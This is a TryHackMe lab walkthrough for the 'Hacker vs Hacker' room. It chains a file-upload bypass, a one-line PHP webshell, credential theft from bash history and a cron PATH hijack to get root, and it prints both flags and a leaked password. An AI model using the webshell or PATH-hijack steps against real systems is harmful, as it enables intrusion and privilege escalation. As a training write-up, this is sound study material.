# Hacker vs Hacker — TryHackMe Walkthrough

**Target IP:** 10.48.139.103  
**Attack Machine:** Kali Linux  
**Difficulty:** Easy  
**Open Ports:** 22 (SSH), 80 (HTTP)  
**Flags:** 2

---

## Flags Captured

| # | Flag | Method |
|---|------|--------|
| 1 | thm{af7e46b68081d4025c5ce10851430617} | File upload bypass → RCE via webshell |
| 2 | thm{7b708e5224f666d3562647816ee2a1d4} | Cron PATH hijack (malicious pkill script) |

---

## Phase 1 — Reconnaissance

### Nmap Scan
```
nmap -sC -sV 10.48.139.103 -oN nmap_scan.txt
```

**Open Ports:**
- 22/tcp — SSH (OpenSSH 8.2p1)
- 80/tcp — HTTP (Apache 2.4.41)

---

## Phase 2 — Web Enumeration

The website is **RecruitSec** with a CV upload form. HTML comments hint at flaws:
```html
<!-- im no security expert - but isn't /cvs on the public website a privacy risk? -->
<!-- seriously, we need to fire that stupid developer intern -->
```

---

## Phase 3 — File Upload Bypass

`/upload.php` reveals the source code. The validation uses `strpos()` to check for `.pdf` in the filename — easily bypassed.

```php
if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
}
```

Create and upload a PHP webshell:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.pdf.php
curl -F "fileToUpload=@shell.pdf.php" http://10.48.139.103/upload.php
```

---

## Phase 4 — User Flag

```bash
curl "http://10.48.139.103/cvs/shell.pdf.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "http://10.48.139.103/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/user.txt"
thm{af7e46b68081d4025c5ce10851430617}
```

---

## Phase 5 — SSH Access

Bash history reveals credentials:
```
curl "http://10.48.139.103/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/.bash_history"

./cve.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
```

SSH in: `ssh lachlan@10.48.139.103` with password **thisistheway123**

Note: A persistence cron kills sessions every few seconds — use one-shot commands.

---

## Phase 6 — Privilege Escalation (PATH Hijack)

The persistence cron has a critical misconfiguration:
```
PATH=/home/lachlan/bin:/bin:/usr/bin
* * * * * root /bin/sleep 1 && for f in `/bin/ls /dev/pts`; do
  /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

`pkill` is called **without an absolute path** and `/home/lachlan/bin` is writable by lachlan.

Hijack it:
```bash
ssh lachlan@10.48.139.103 \
  'echo "#!/bin/bash
cat /root/root.txt > /home/lachlan/rootflag.txt
chmod 777 /home/lachlan/rootflag.txt" > /home/lachlan/bin/pkill \
  && chmod +x /home/lachlan/bin/pkill'
```

---

## Phase 7 — Root Flag

```bash
ssh lachlan@10.48.139.103 'cat /home/lachlan/rootflag.txt'
thm{7b708e5224f666d3562647816ee2a1d4}
```

---

## Vulnerability Chain
1. **Insecure File Upload** — `strpos()` check allows `.pdf.php` bypass
2. **Credential Disclosure** — Bash history exposes password
3. **Cron PATH Hijacking** — `pkill` without absolute path + writable `/home/lachlan/bin` = root RCE
